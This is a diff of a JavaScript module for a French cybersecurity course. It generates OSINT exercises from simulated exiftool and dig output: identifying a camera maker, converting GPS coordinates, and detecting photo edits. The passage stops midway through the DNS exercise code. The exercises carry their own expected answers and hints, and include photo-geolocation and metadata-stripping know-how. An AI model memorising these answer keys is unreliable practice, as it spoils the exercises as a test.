@@ -1,751 +1,877 @@
 // ═══════════════════════════════════════════════════════════════════
-// tp-engine-osint-detect.js — CAS-IN TP delta v99
-// 4 TP "moyens" : OSINT EXIF, OSINT DNS, Sigma Rules, C2 Frameworks
-// Chargé APRÈS tp-engine.js (utilise rand, STATE, GENERATORS, helpers)
+// tp-engine-osint-detect.js — CAS-IN TP delta v103 (REFONTE PRATIQUE)
+// 4 TP "OSINT & Détection" : EXIF, DNS, Sigma, C2
+// Chaque TP a 3 niveaux progressifs A → B → C
+// Artefact concret (output exiftool/dig/YAML/timeline) + input + 3 indices
+// Chargé APRÈS tp-engine.js (utilise rand, STATE, helpers communs)
 // ═══════════════════════════════════════════════════════════════════
 
 (function () {
   'use strict';
 
   // ────────────────────────────────────────────────────────────────
-  // HELPER : buildQCMCard (autonome — pas de dépendance v97/v98)
+  // HELPERS partagés (autonomes — pas de dépendance externe)
   // ────────────────────────────────────────────────────────────────
-  function buildQCMCard(opts) {
+  function buildPracticeCard(opts) {
     const id = opts.prefix;
     const div = document.createElement('div');
     div.className = 'ex-card';
-    const choicesHTML = opts.choices.map((c, i) => `
-      <button class="ex-choice" data-idx="${i}" id="ch-${id}-${i}">
-        <span class="ex-choice-letter">${String.fromCharCode(65+i)}</span>
-        <span class="ex-choice-text">${c.text}</span>
-      </button>`).join('');
 
     div.innerHTML = `
       <div class="ex-header">
-        <div class="ex-num" id="ex-num-${id}">${opts.icon || '🎯'}</div>
+        <div class="ex-num" id="ex-num-${id}">${opts.icon || '🔍'}</div>
         <div class="ex-title">${opts.title}</div>
-        <span class="ex-badge easy">${opts.badge || 'moyen'}</span>
+        <span class="ex-badge easy">${opts.badge || 'pratique'}</span>
       </div>
-      <div class="ex-scenario">${opts.scenario}</div>
-      <div class="ex-choices">${choicesHTML}</div>
-      ${opts.hintFn ? `<div style="margin-top:.6rem"><button class="btn-hint" id="btn-hint-${id}">💡 Indice</button></div>` : ''}
+      <div class="ex-scenario">${opts.question}</div>
+      <div style="margin:.7rem 0">${opts.artefactHTML}</div>
+      <div class="ex-input-row" style="flex-wrap:wrap;gap:8px">
+        ${opts.inputLabel ? `<span class="ex-input-label">${opts.inputLabel}</span>` : ''}
+        <input class="ex-input" id="inp-${id}" placeholder="${opts.placeholder || ''}" autocomplete="off" spellcheck="false" style="width:100%;max-width:340px;font-family:var(--mono);min-height:40px;box-sizing:border-box">
+        <button class="btn-hint" id="btn-hint1-${id}" type="button">💡 Méthode</button>
+        <button class="btn-hint" id="btn-hint2-${id}" type="button" disabled style="opacity:.4">💡💡 Où regarder</button>
+        <button class="btn-hint" id="btn-hint3-${id}" type="button" disabled style="opacity:.4">💡💡💡 Réponse</button>
+        <button class="btn-validate" id="btn-validate-${id}" type="button">Valider ✓</button>
+        <button class="btn-next" id="btn-next-${id}" type="button" style="display:none">Exercice suivant →</button>
+      </div>
       <div class="ex-feedback" id="ex-feedback-${id}"></div>
-      <button class="btn-next" id="btn-next-${id}" onclick="newExercise()" style="display:none;margin-top:.5rem">Exercice suivant →</button>
     `;
+
     setTimeout(() => {
-      opts.choices.forEach((c, i) => {
-        const btn = div.querySelector(`#ch-${id}-${i}`);
-        if (btn) btn.addEventListener('click', () => handleChoice(id, i, c.correct, c.explain, opts.choices));
-      });
-      if (opts.hintFn) {
-        const hb = div.querySelector(`#btn-hint-${id}`);
-        if (hb) hb.addEventListener('click', () => {
-          if (typeof markHintUsed === 'function') markHintUsed();
-          const fb = document.getElementById(`ex-feedback-${id}`);
-          if (fb) { fb.className = 'ex-feedback correct'; fb.innerHTML = `💡 ${opts.hintFn()}`; }
-        });
+      const inp = div.querySelector(`#inp-${id}`);
+      const fb  = div.querySelector(`#ex-feedback-${id}`);
+      const nextBtn = div.querySelector(`#btn-next-${id}`);
+      const valBtn  = div.querySelector(`#btn-validate-${id}`);
+      const normalize = opts.normalize || (v => v.trim().toLowerCase().replace(/\s+/g, ''));
+
+      function validate() {
+        if (!inp || !fb) return;
+        const got = normalize(inp.value);
+        const exp = normalize(opts.expected);
+        const ok  = got === exp;
+
+        if (ok) {
+          inp.className = 'ex-input correct';
+          valBtn.disabled = true;
+          nextBtn.style.display = 'inline-block';
+          const card = inp.closest('.ex-card');
+          if (card) card.className = 'ex-card solved';
+          const numEl = document.getElementById(`ex-num-${id}`);
+          if (numEl) numEl.className = 'ex-num solved';
+          fb.className = 'ex-feedback correct';
+          fb.innerHTML = `✓ Correct ! ${opts.explain || ''}`;
+          if (typeof STATE !== 'undefined' && !STATE.hintUsed && typeof incSolved === 'function') {
+            incSolved(STATE.cat);
+          }
+        } else {
+          inp.className = 'ex-input wrong';
+          fb.className = 'ex-feedback wrong';
+          fb.innerHTML = `✗ "<code>${escapeHTML(inp.value)}</code>" incorrect. Utilise les indices progressifs ou réessaie.`;
+          if (typeof breakStreak === 'function') breakStreak();
+          setTimeout(() => { if (inp) inp.className = 'ex-input'; }, 700);
+        }
       }
+
+      function showHint(level) {
+        if (typeof markHintUsed === 'function') markHintUsed();
+        if (!fb || !opts.hints || !opts.hints[level-1]) return;
+        fb.className = 'ex-feedback correct';
+        const labels = ['Méthode', 'Où regarder', 'Réponse étape par étape'];
+        fb.innerHTML = `💡 <strong>Niveau ${level} — ${labels[level-1]}</strong><br>${opts.hints[level-1]}`;
+        if (level < 3) {
+          const next = div.querySelector(`#btn-hint${level+1}-${id}`);
+          if (next) { next.disabled = false; next.style.opacity = '1'; }
+        }
+        const cur = div.querySelector(`#btn-hint${level}-${id}`);
+        if (cur) cur.style.opacity = '.4';
+      }
+
+      div.querySelector(`#btn-hint1-${id}`).addEventListener('click', () => showHint(1));
+      div.querySelector(`#btn-hint2-${id}`).addEventListener('click', () => showHint(2));
+      div.querySelector(`#btn-hint3-${id}`).addEventListener('click', () => showHint(3));
+      valBtn.addEventListener('click', validate);
+      nextBtn.addEventListener('click', () => { if (typeof newExercise === 'function') newExercise(); });
+      if (inp) inp.addEventListener('keydown', e => { if (e.key === 'Enter') validate(); });
     }, 50);
+
     return div;
   }
 
-  function handleChoice(prefix, idx, isCorrect, explain, allChoices) {
-    const fb = document.getElementById(`ex-feedback-${prefix}`);
-    const choiceBtn = document.getElementById(`ch-${prefix}-${idx}`);
-    const nextBtn = document.getElementById(`btn-next-${prefix}`);
-    if (!fb || !choiceBtn) return;
+  function escapeHTML(s) {
+    return String(s).replace(/[&<>"']/g, c => ({
+      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+    }[c]));
+  }
 
-    if (isCorrect) {
-      choiceBtn.classList.add('correct');
-      allChoices.forEach((_, i) => {
-        const b = document.getElementById(`ch-${prefix}-${i}`);
-        if (b) b.disabled = true;
-      });
-      fb.className = 'ex-feedback correct';
-      fb.innerHTML = `✓ Correct ! ${explain}`;
-      const card = choiceBtn.closest('.ex-card');
-      if (card) card.classList.add('solved');
-      const numEl = document.getElementById(`ex-num-${prefix}`);
-      if (numEl) numEl.classList.add('solved');
-      if (nextBtn) nextBtn.style.display = 'inline-flex';
-      if (typeof STATE !== 'undefined' && !STATE.hintUsed && typeof incSolved === 'function') {
-        incSolved(STATE.cat);
+  function renderTextBlock(text, opts) {
+    opts = opts || {};
+    const title = opts.title || '';
+    const highlights = opts.highlights || [];
+    const lines = text.split('\n').map(line => {
+      let cls = '';
+      for (const h of highlights) {
+        if (line.includes(h.match)) {
+          cls = `background:rgba(126,192,255,.08);border-left:3px solid var(${h.color || '--cyan'});padding-left:.4rem;display:block;margin-left:-.4rem`;
+          break;
+        }
       }
-    } else {
-      choiceBtn.classList.add('wrong');
-      choiceBtn.disabled = true;
-      fb.className = 'ex-feedback wrong';
-      fb.innerHTML = `✗ ${explain || 'Mauvaise réponse.'}`;
-      if (typeof breakStreak === 'function') breakStreak();
-    }
+      return `<div style="${cls}">${escapeHTML(line) || '&nbsp;'}</div>`;
+    });
+    return `
+      <div style="border:1px solid var(--border);border-radius:8px;overflow:hidden;background:var(--bg)">
+        ${title ? `<div style="padding:.4rem .8rem;font-size:.7rem;color:var(--gold);background:rgba(240,192,64,.05);border-bottom:1px solid var(--border);font-weight:700;letter-spacing:.05em;text-transform:uppercase">${title}</div>` : ''}
+        <pre style="margin:0;padding:.7rem .8rem;font-family:var(--mono);font-size:.78rem;line-height:1.5;color:var(--text);overflow-x:auto;-webkit-overflow-scrolling:touch;white-space:pre">${lines.join('')}</pre>
+      </div>
+    `;
   }
 
   // ════════════════════════════════════════════════════════════════
-  // TP 1 : OSINT EXIF & métadonnées
+  // TP 1 : EXIF — Output exiftool
   // ════════════════════════════════════════════════════════════════
+
+  const CAMERAS = [
+    { make: 'Canon',    model: 'EOS 5D Mark IV',     soft: 'Adobe Camera Raw 13.4' },
+    { make: 'Nikon',    model: 'D850',                soft: 'Adobe Photoshop CC 2024' },
+    { make: 'Sony',     model: 'ILCE-7M3',            soft: 'Lightroom Classic 12.5' },
+    { make: 'Apple',    model: 'iPhone 14 Pro',       soft: 'iOS 17.4.1' },
+    { make: 'Google',   model: 'Pixel 8',             soft: 'Android 14' },
+    { make: 'Samsung',  model: 'SM-S908B',            soft: 'Samsung Camera 1.0' },
+    { make: 'Fujifilm', model: 'X-T5',                soft: 'Capture One 23' },
+    { make: 'OnePlus',  model: '11',                  soft: 'OxygenOS 14' }
+  ];
+
+  function _genExifOutput(opts) {
+    opts = opts || {};
+    const cam = opts.camera || CAMERAS[0];
+    const lines = [
+      'ExifTool Version Number         : 12.76',
+      `File Name                       : ${opts.fileName || 'IMG_4821.jpg'}`,
+      `File Size                       : ${(rand(2, 8)).toFixed(1)} MB`,
+      `File Modification Date/Time     : ${opts.modifyDate || '2025:09:12 14:23:47+02:00'}`,
+      'File Type                       : JPEG',
+      'MIME Type                       : image/jpeg',
+      `Make                            : ${cam.make}`,
+      `Camera Model Name               : ${cam.model}`,
+      `Software                        : ${opts.software || cam.soft}`,
+      `Date/Time Original              : ${opts.dateOriginal || '2025:09:12 14:23:47'}`,
+      `Modify Date                     : ${opts.modifyDateMeta || opts.dateOriginal || '2025:09:12 14:23:47'}`,
+      `Exposure Time                   : 1/${[125, 250, 500, 1000][rand(0,3)]}`,
+      `F Number                        : ${[1.8, 2.8, 4.0, 5.6][rand(0,3)]}`,
+      `ISO                             : ${[100, 200, 400, 800][rand(0,3)]}`,
+    ];
+    if (opts.gps) {
+      lines.push(`GPS Latitude                    : ${opts.gps.latStr}`);
+      lines.push(`GPS Latitude Ref                : ${opts.gps.latRef}`);
+      lines.push(`GPS Longitude                   : ${opts.gps.lonStr}`);
+      lines.push(`GPS Longitude Ref               : ${opts.gps.lonRef}`);
+      lines.push(`GPS Position                    : ${opts.gps.latStr} ${opts.gps.latRef}, ${opts.gps.lonStr} ${opts.gps.lonRef}`);
+    }
+    if (opts.extraLines) lines.push(...opts.extraLines);
+    return lines.join('\n');
+  }
+
+  // Décimal → DMS string "46 deg 31' 04.32\""
+  function _decimalToDMS(dec) {
+    const abs = Math.abs(dec);
+    const deg = Math.floor(abs);
+    const minFloat = (abs - deg) * 60;
+    const min = Math.floor(minFloat);
+    const sec = ((minFloat - min) * 60).toFixed(2);
+    return `${deg} deg ${String(min).padStart(2,'0')}' ${sec}"`;
+  }
 
   function genEXIF() {
-    const qType = rand(0, 6);
-    const opts = { prefix: 'exif', icon: '🖼️', title: 'OSINT — Métadonnées EXIF', badge: 'osint' };
+    const level = rand(0, 2);
+    const opts = { prefix: 'exif', icon: '🖼️', title: 'EXIF — Lecture exiftool' };
 
-    if (qType === 0) {
-      // Outil de référence
-      const choices = [
-        { text: '<code>exiftool</code> (Phil Harvey) — lit/écrit EXIF/IPTC/XMP sur 200+ formats', correct: true,
-          explain: `<strong>exiftool</strong> est l'outil canonique de la communauté forensique/OSINT. Usage : <code>exiftool photo.jpg</code>. Lit aussi les métadonnées audio, vidéo, PDF, Office. Supporte la modification (anti-forensique) et les <em>tags</em> propriétaires (Canon, Nikon, Apple).` },
-        { text: '<code>strings</code> sur le fichier', correct: false,
-          explain: `<code>strings</code> peut révéler des chaînes ASCII (notamment des noms de logiciel "Adobe Photoshop"), mais ne parse pas les structures EXIF binaires — beaucoup de métadonnées manquées.` },
-        { text: '<code>file</code> commande Unix', correct: false,
-          explain: `<code>file image.jpg</code> identifie le format mais ne lit pas les métadonnées détaillées (auteur, GPS, etc.).` },
-        { text: '<code>md5sum</code>', correct: false,
-          explain: `Calcule un hash, n'extrait pas les métadonnées.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau A : extraire le Make (fabricant) ──
+    if (level === 0) {
+      const cam = CAMERAS[rand(0, CAMERAS.length - 1)];
+      const exifOutput = _genExifOutput({ camera: cam });
+
+      const artefactHTML = renderTextBlock(exifOutput, {
+        title: 'Output : exiftool IMG_4821.jpg',
+        highlights: [{ match: 'Make ', color: '--cyan' }]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Quel outil CLI est <strong>la référence</strong> pour extraire les métadonnées EXIF d'images ?`,
-        choices,
-        hintFn: () => `Phil Harvey développe exiftool depuis 2003. Open source, multi-plateforme, supporte 200+ formats. Alternatives GUI : ExifReader, PhotoStudio, Jeffrey's EXIF viewer (web).`
+        badge: 'lecture',
+        artefactHTML,
+        question: `Voici la sortie de <code>exiftool</code> sur une photo trouvée sur un poste. <strong>Quel est le fabricant de l'appareil</strong> qui a pris la photo (champ <code>Make</code>) ?`,
+        inputLabel: 'Make :',
+        placeholder: 'Canon',
+        expected: cam.make,
+        normalize: v => v.trim().toLowerCase(),
+        hints: [
+          `Le fabricant est dans le champ <code>Make</code> du tag EXIF. Cherche cette ligne dans la sortie.`,
+          `Repère la ligne commençant par <code>Make</code> suivie de <code>:</code>. La valeur est ce qui suit.`,
+          `Champ <code>Make = ${cam.make}</code>. Modèle complet : <code>${cam.model}</code>.`
+        ],
+        explain: `Fabricant <strong>${cam.make}</strong>, modèle <code>${cam.model}</code>. Combiné au numéro de série (si présent : <code>SerialNumber</code>), c'est un pivot OSINT puissant — l'identifiant unique du boîtier.`
       });
     }
 
-    if (qType === 1) {
-      // GPS : format conversion
-      const lat = (45 + Math.random() * 3).toFixed(4);  // 45-48 = Suisse/France
-      const lon = (6 + Math.random() * 4).toFixed(4);   // 6-10
-      const degLat = parseFloat(lat);
-      const dmsLat = `${Math.floor(degLat)}° ${Math.floor((degLat % 1) * 60)}' ${(((degLat % 1) * 60) % 1 * 60).toFixed(2)}"`;
-      const correct = `${dmsLat} N`;
-      const choices = [
-        { text: correct, correct: true,
-          explain: `Conversion décimal → DMS : partie entière = degrés, multiplier décimal par 60 = minutes, reste × 60 = secondes. <strong>${lat}</strong> N (décimal) ≈ <strong>${correct}</strong>. GPSLatitudeRef = "N" (Nord) car valeur positive.` },
-        { text: `${lat}° ${Math.floor(degLat / 60)}' 0" N`, correct: false,
-          explain: `Mauvaise conversion : on prend la partie entière en degrés, pas une division par 60.` },
-        { text: `${dmsLat} S`, correct: false,
-          explain: `S = Sud (latitude négative). Notre coordonnée est positive donc N (Nord).` },
-        { text: `${lat}° N (Centesimal sur 100)`, correct: false,
-          explain: `Le format DMS utilise base 60 (60 minutes par degré, 60 secondes par minute), pas 100. La forme décimale ${lat}° existe mais n'est pas l'écriture DMS demandée.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau B : extraire la latitude en décimal depuis le GPS DMS ──
+    if (level === 1) {
+      const cam = CAMERAS[rand(0, CAMERAS.length - 1)];
+      // Coordonnées GPS plausibles (Suisse ou Europe)
+      const latDeg = rand(45, 48);
+      const latMin = rand(10, 55);
+      const latSec = rand(0, 59) + Math.random();
+      const latDec = latDeg + latMin / 60 + latSec / 3600;
+      const latStr = `${latDeg} deg ${String(latMin).padStart(2,'0')}' ${latSec.toFixed(2)}"`;
+      const lonDeg = rand(5, 10);
+      const lonMin = rand(10, 55);
+      const lonSec = (rand(0, 5990) / 100);
+      const lonStr = `${lonDeg} deg ${String(lonMin).padStart(2,'0')}' ${lonSec.toFixed(2)}"`;
+
+      const exifOutput = _genExifOutput({
+        camera: cam,
+        gps: { latStr, latRef: 'N', lonStr, lonRef: 'E' }
+      });
+
+      const artefactHTML = renderTextBlock(exifOutput, {
+        title: 'Output : exiftool photo.jpg',
+        highlights: [
+          { match: 'GPS Latitude  ', color: '--gold' },
+          { match: 'GPS Latitude Ref', color: '--gold' }
+        ]
+      });
+
+      // Réponse attendue : latitude en décimal arrondie à 4 chiffres
+      const latDecRounded = latDec.toFixed(4);
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Une photo a une latitude EXIF de <strong>${lat}°</strong> (décimal). Quelle est la représentation <strong>DMS</strong> (degrés/minutes/secondes) ?`,
-        choices,
-        hintFn: () => `Décimal → DMS : entier = degrés. (décimal × 60) → minutes. ((reste × 60) × 60) → secondes. Hémisphère : N/S pour latitude (positif = N), E/W pour longitude (positif = E).`
+        badge: 'calcul',
+        artefactHTML,
+        question: `La photo a des coordonnées GPS. <strong>Convertis la latitude DMS en décimal</strong> (4 chiffres après la virgule). Formule : <code>deg + min/60 + sec/3600</code>.`,
+        inputLabel: 'Latitude :',
+        placeholder: '46.5179',
+        expected: latDecRounded,
+        normalize: v => {
+          const n = parseFloat(v.trim().replace(',', '.'));
+          return isNaN(n) ? v.trim() : n.toFixed(4);
+        },
+        hints: [
+          `Pour convertir DMS → décimal : <code>degrés + minutes/60 + secondes/3600</code>. L'hémisphère N/S/E/W détermine le signe (N et E = positif).`,
+          `Lis : <code>${latDeg} deg ${latMin}' ${latSec.toFixed(2)}"</code>. Calcule <code>${latDeg} + ${latMin}/60 + ${latSec.toFixed(2)}/3600</code>.`,
+          `${latDeg} + ${(latMin/60).toFixed(6)} + ${(latSec/3600).toFixed(6)} ≈ <strong>${latDecRounded}</strong> (Latitude Ref = N donc positif).`
+        ],
+        explain: `Latitude = <strong>${latDecRounded}°</strong> N. Coordonnées GPS dans les EXIF = jackpot OSINT (géolocalisation au mètre). À croiser avec Google Maps / OpenStreetMap pour confirmer le lieu.`
       });
     }
 
-    if (qType === 2) {
-      // Plateforme qui ne strip pas l'EXIF
-      const choices = [
-        { text: 'Flickr (par défaut, conserve l\'EXIF complet)', correct: true,
-          explain: `<strong>Flickr</strong> est connu pour conserver l'EXIF complet par défaut (utile pour les photographes pros). À l'inverse : <strong>Facebook, Instagram, Twitter/X, WhatsApp</strong> strippent généralement EXIF (GPS, modèle d'appareil) à l'upload. Toujours vérifier en téléchargeant l'image et en passant exiftool — politique peut changer.` },
-        { text: 'Facebook', correct: false,
-          explain: `Facebook strippe les EXIF à l'upload depuis 2014 (mais ajoute son propre tracking dans le fichier).` },
-        { text: 'Instagram', correct: false,
-          explain: `Instagram strippe également l'EXIF à l'upload.` },
-        { text: 'WhatsApp', correct: false,
-          explain: `WhatsApp strippe l'EXIF lors de l'envoi de photos (compression + sanitisation).` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau C : détecter une édition par incohérence timestamps + Software ──
+    {
+      const cam = CAMERAS[rand(0, CAMERAS.length - 1)];
+      // Date originale + date de modif postérieure + software d'édition
+      const editingSoftware = ['Adobe Photoshop 24.7', 'GIMP 2.10', 'Lightroom Classic 13.0', 'Affinity Photo 2'][rand(0,3)];
+      const dateOrig = '2024:11:15 09:32:14';
+      const dateModifMeta = '2025:03:22 18:47:09';
+
+      const exifOutput = _genExifOutput({
+        camera: cam,
+        dateOriginal: dateOrig,
+        modifyDateMeta: dateModifMeta,
+        software: editingSoftware
+      });
+
+      const artefactHTML = renderTextBlock(exifOutput, {
+        title: 'Output : exiftool suspect.jpg',
+        highlights: [
+          { match: 'Software', color: '--purple' },
+          { match: 'Date/Time Original', color: '--purple' },
+          { match: 'Modify Date', color: '--purple' }
+        ]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Quelle plateforme conserve traditionnellement les <strong>métadonnées EXIF complètes</strong> à l'upload (utile pour OSINT) ?`,
-        choices,
-        hintFn: () => `Politique des plateformes en 2026 : Flickr garde EXIF (photographes pros). FB/Insta/Twitter/WhatsApp strippent. Toujours tester en téléchargeant et passant exiftool — les politiques changent.`
+        badge: 'identification',
+        artefactHTML,
+        question: `Examine attentivement les champs <code>Software</code>, <code>Date/Time Original</code> et <code>Modify Date</code>. <strong>Cette photo a-t-elle été éditée après la prise de vue</strong> ?<br><span style="color:var(--dim);font-size:.85rem">Réponse attendue : <code>oui</code> ou <code>non</code>.</span>`,
+        inputLabel: 'Édité :',
+        placeholder: 'oui',
+        expected: 'oui',
+        normalize: v => {
+          const s = v.trim().toLowerCase().replace(/[éè]/g, 'e');
+          if (['oui','yes','y','o','edited','edite','modifié','modifie','vrai','true'].includes(s)) return 'oui';
+          if (['non','no','n','original','intact','pas','false','faux'].includes(s)) return 'non';
+          return s;
+        },
+        hints: [
+          `Deux indices d'édition : (1) <code>Modify Date</code> &gt; <code>Date/Time Original</code> (écart de plusieurs mois/jours), (2) <code>Software</code> mentionne un éditeur (Photoshop, GIMP, Lightroom…) plutôt qu'un firmware d'appareil.`,
+          `Compare : <code>Date/Time Original = ${dateOrig}</code> vs <code>Modify Date = ${dateModifMeta}</code>. Et <code>Software = ${editingSoftware}</code>.`,
+          `<code>Modify Date</code> est postérieure de plusieurs mois à <code>Date/Time Original</code>, ET le <code>Software</code> est <strong>${editingSoftware}</strong> (éditeur d'image). Réponse : <strong>oui</strong>, la photo a été éditée.`
+        ],
+        explain: `Photo éditée. Triade d'indices : (1) Modify Date &gt; Date/Time Original (${dateModifMeta} vs ${dateOrig}), (2) Software = <code>${editingSoftware}</code> (éditeur, pas firmware). Si le tag <code>Software</code> avait été <code>${cam.soft}</code> seulement, c'aurait été un export d'appareil natif.`
       });
     }
-
-    if (qType === 3) {
-      // Champs OSINT-utiles dans EXIF
-      const choices = [
-        { text: '<strong>Make/Model</strong> (appareil), <strong>DateTimeOriginal</strong> (date de prise), <strong>GPSLatitude/Longitude</strong>, <strong>Software</strong> (logiciel éditeur)', correct: true,
-          explain: `Les champs <strong>les plus précieux en OSINT</strong> : <code>Make/Model</code> (ex: "Canon EOS 5D Mark IV" → marque + modèle pour pivot), <code>DateTimeOriginal</code> vs <code>ModifyDate</code> (incohérence = montage), <code>GPSLatitude/Longitude/GPSAltitude</code> (géolocalisation précise), <code>Software</code> ("Adobe Photoshop 24.0" → édition révèle un montage). Aussi : <code>SerialNumber</code> (pivot unique sur le boîtier !).` },
-        { text: 'Uniquement le hash MD5 du fichier', correct: false,
-          explain: `Le hash ne fait pas partie de l'EXIF, c'est calculé par l'outil forensique.` },
-        { text: 'Le nom de l\'utilisateur Windows ayant édité', correct: false,
-          explain: `Pas dans l'EXIF. Existe dans les métadonnées Office/PDF (champ Author), pas dans EXIF d'image.` },
-        { text: 'L\'adresse IP de l\'appareil photo', correct: false,
-          explain: `Un appareil photo n'a pas d'IP (sauf appareils connectés Wi-Fi récents, et même alors l'IP n'est pas dans l'EXIF).` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Quels champs EXIF sont les plus <strong>OSINT-utiles</strong> ?`,
-        choices,
-        hintFn: () => `Top 5 : Make/Model (appareil), DateTimeOriginal (prise), GPSLatitude/Longitude (géolocalisation), Software (logiciel éditeur), SerialNumber (pivot unique boîtier). Bonus : LensInfo, FocalLength, ExposureTime.`
-      });
-    }
-
-    if (qType === 4) {
-      // Anti-forensique EXIF
-      const choices = [
-        { text: '<code>exiftool -all= image.jpg</code> — supprime toutes les métadonnées', correct: true,
-          explain: `<code>exiftool -all= file</code> efface tous les tags. <code>-overwrite_original</code> pour ne pas créer de backup. Variantes utiles : <code>exiftool -gps:all= file</code> (GPS seulement), <code>exiftool -tagsfromfile clean.jpg source.jpg</code> (copier les tags d'un fichier "propre"). Attention : ne supprime PAS les données stéganographiques cachées dans les pixels.` },
-        { text: '<code>chmod 000 image.jpg</code>', correct: false,
-          explain: `chmod change les permissions du fichier, mais ne touche pas son contenu (EXIF reste).` },
-        { text: '<code>cat image.jpg | grep -v EXIF</code>', correct: false,
-          explain: `grep ne fonctionne pas sur du binaire structuré — les blocs EXIF survivront. Approche inadaptée.` },
-        { text: 'Renommer en <code>.txt</code>', correct: false,
-          explain: `Renommer n'altère pas le contenu. Le JPEG reste un JPEG avec son EXIF.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Comment <strong>supprimer toutes les métadonnées EXIF</strong> d'une image (anti-forensique) ?`,
-        choices,
-        hintFn: () => `exiftool est aussi un outil d'écriture/effacement. <code>-all=</code> efface tous les tags. <code>-overwrite_original</code> pour pas de backup. Idéal pour anti-forensique (mais ne nettoie pas la stéganographie).`
-      });
-    }
-
-    if (qType === 5) {
-      // PDF metadata
-      const choices = [
-        { text: '<strong>XMP</strong> (Adobe), <strong>DocInfo</strong> (Author, CreationDate, Producer), <strong>Creator Tool</strong>', correct: true,
-          explain: `Les PDF embarquent <strong>XMP</strong> (Adobe Extensible Metadata Platform, basé sur RDF/XML) et un dictionnaire <strong>DocInfo</strong> avec : <code>Author</code> (souvent le nom d'utilisateur OS au moment de la création — fuite classique !), <code>CreationDate</code>, <code>ModDate</code>, <code>Producer</code> (logiciel : Microsoft Word, Adobe Acrobat), <code>Creator</code>. Exemple OSINT historique : doc "iraq dodgy dossier" 2003 → champ Author révéla 4 noms britanniques (Cabinet Office).` },
-        { text: 'Pas de métadonnées dans les PDF', correct: false,
-          explain: `Faux. Les PDF ont des métadonnées riches (XMP + DocInfo), souvent peu nettoyées.` },
-        { text: 'EXIF identique aux JPEG', correct: false,
-          explain: `Les PDF n'utilisent pas EXIF (qui est spécifique aux images). Ils ont XMP et DocInfo.` },
-        { text: 'Uniquement la taille du fichier', correct: false,
-          explain: `Bien plus que ça : auteur, dates, logiciel, parfois historique d'édition.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Quelles métadonnées sont embarquées dans un <strong>PDF</strong> (souvent oubliées avant publication) ?`,
-        choices,
-        hintFn: () => `PDF = XMP (Adobe, XML/RDF) + DocInfo (Author, CreationDate, Producer, Creator). Author = souvent le nom d'utilisateur OS du créateur. Lire : <code>exiftool fichier.pdf</code> ou <code>pdfinfo</code> (poppler).`
-      });
-    }
-
-    // qType === 6 : timestamp mismatch
-    const choices = [
-      { text: 'Comparer <code>DateTimeOriginal</code> (prise de vue) vs <code>ModifyDate</code> vs <code>FileModifyDate</code> (FS) — incohérence = édition postérieure', correct: true,
-        explain: `<strong>3 timestamps</strong> à confronter :<br>• <code>DateTimeOriginal</code> = quand la photo a été prise (EXIF, fixé par l'appareil)<br>• <code>ModifyDate</code> (EXIF) = dernière modification du fichier image<br>• <code>FileModifyDate</code> = timestamp filesystem (peut être modifié par <code>touch</code>)<br>Si <code>ModifyDate</code> > <code>DateTimeOriginal</code> → la photo a été éditée après la prise. Si <code>FileModifyDate</code> < <code>DateTimeOriginal</code> → potentiel timestomping.` },
-      { text: 'Lire le hash MD5 et comparer avec une base', correct: false,
-        explain: `Le hash identifie le fichier exact mais ne révèle pas une édition. Pour détecter des modifs, comparer les timestamps internes.` },
-      { text: 'Faire un OCR sur l\'image', correct: false,
-        explain: `OCR extrait du texte des pixels — sans rapport avec la détection d'édition par métadonnées.` },
-      { text: 'Demander à ChatGPT', correct: false,
-        explain: `Une IA peut suggérer des incohérences visuelles, mais l'analyse forensique demande des métadonnées concrètes (exiftool).` },
-    ].sort(() => Math.random() - 0.5);
-    return buildQCMCard({
-      ...opts,
-      scenario: `Comment <strong>détecter qu'une photo a été éditée</strong> après la prise (via EXIF) ?`,
-      choices,
-      hintFn: () => `Comparer 3 timestamps : DateTimeOriginal (prise), ModifyDate (EXIF édition), FileModifyDate (FS). Logiciel éditeur dans <code>Software</code> ("Adobe Photoshop...") est aussi un indicateur immédiat.`
-    });
   }
 
   // ════════════════════════════════════════════════════════════════
-  // TP 2 : OSINT DNS & Infrastructure
+  // TP 2 : DNS — Output dig
   // ════════════════════════════════════════════════════════════════
+
+  const DNS_DOMAINS = [
+    { name: 'example.com',  ips: ['93.184.216.34'],   mx: ['mail.example.com'] },
+    { name: 'unil.ch',      ips: ['130.223.225.18'],  mx: ['smtp1.unil.ch', 'smtp2.unil.ch'] },
+    { name: 'bcv.ch',       ips: ['194.6.131.10'],    mx: ['mx.bcv.ch'] },
+    { name: 'swisscom.ch',  ips: ['195.186.245.16'],  mx: ['mx-mta1.bluewin.ch'] },
+    { name: 'admin.ch',     ips: ['162.23.130.122'],  mx: ['relay.admin.ch'] },
+    { name: 'epfl.ch',      ips: ['128.178.222.108'], mx: ['mail-relay.epfl.ch'] }
+  ];
+
+  function _genDigOutput(opts) {
+    opts = opts || {};
+    const domain = opts.domain;
+    const type = opts.type || 'A';
+    const records = opts.records || [];
+    const lines = [
+      `; <<>> DiG 9.18.12-1+ubuntu0.22.04.4-Ubuntu <<>> ${domain.name} ${type}`,
+      ';; global options: +cmd',
+      ';; Got answer:',
+      `;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: ${rand(10000, 65000)}`,
+      ';; flags: qr rd ra; QUERY: 1, ANSWER: ' + records.length + ', AUTHORITY: 0, ADDITIONAL: 1',
+      '',
+      ';; QUESTION SECTION:',
+      `;${domain.name}.${' '.repeat(Math.max(1, 30 - domain.name.length))}IN${' '.repeat(6)}${type}`,
+      '',
+      ';; ANSWER SECTION:',
+      ...records.map(r => `${domain.name}.${' '.repeat(Math.max(1, 30 - domain.name.length))}3600${' '.repeat(2)}IN${' '.repeat(6)}${type}${' '.repeat(6)}${r}`),
+      '',
+      `;; Query time: ${rand(2, 80)} msec`,
